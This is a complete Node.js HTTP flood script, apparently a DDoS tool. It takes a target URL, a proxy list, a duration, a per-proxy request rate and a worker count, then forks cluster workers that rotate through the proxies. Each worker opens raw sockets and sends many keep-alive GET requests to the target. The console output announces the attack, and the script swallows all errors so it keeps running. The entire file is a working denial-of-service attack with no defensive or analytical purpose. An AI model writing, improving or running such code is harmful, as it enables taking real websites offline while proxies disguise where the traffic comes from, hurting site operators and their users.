const request = require("request");
const EventEmitter = require('events');
const fs = require('fs');
const url = require('url');
const cluster = require('cluster');
const path = require("path");

const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

function randomNumber(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

const UAs = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
];

const fileName = path.basename(__filename);
const target = process.argv[2];
const parsed = url.parse(target);
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
const time = process.argv[4];
const ratelimit = process.argv[5];
const host = parsed.host;
let theproxy = 0;
let proxy = proxies[theproxy];

console.log("\x1b[36musage\x1b[37m: node " + fileName + " <Target> <Proxies> <Duration> <Request per IP>");
console.log("\x1b[36mAttempting\x1b[37m to get : %s || \x1b[35m%s\x1b[37m", process.argv[2], parsed.host);
console.log("Attack has been sent for %s seconds", process.argv[4]);
console.log("[%d] Proxies loaded!", proxies.length);

if (cluster.isMaster) {
    for (let i = 0; i < process.argv[6]; i++) {
        cluster.fork();
    }
} else {
    const int = setInterval(() => {
        theproxy = (theproxy + 1) % proxies.length;
        proxy = proxies[theproxy];
        
        if (proxy && proxy.length > 5) {
            proxy = proxy.split(':');
        } else {
            return false;
        }
        
        const s = require('net').Socket();
        s.connect(proxy[1], proxy[0]);
        console.log(proxy);
        
        s.setTimeout(10000);
        for (let i = 0; i < ratelimit; i++) {
            const randomUA = UAs[randomNumber(0, UAs.length)];
            s.write(`GET ${target}/ HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${randomUA}\r\nConnection: Keep-Alive\r\n\r\n`);
        }
        
        s.on('data', () => { setTimeout(() => { s.destroy(); }, 5000); });
    });
    setTimeout(() => clearInterval(int), time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
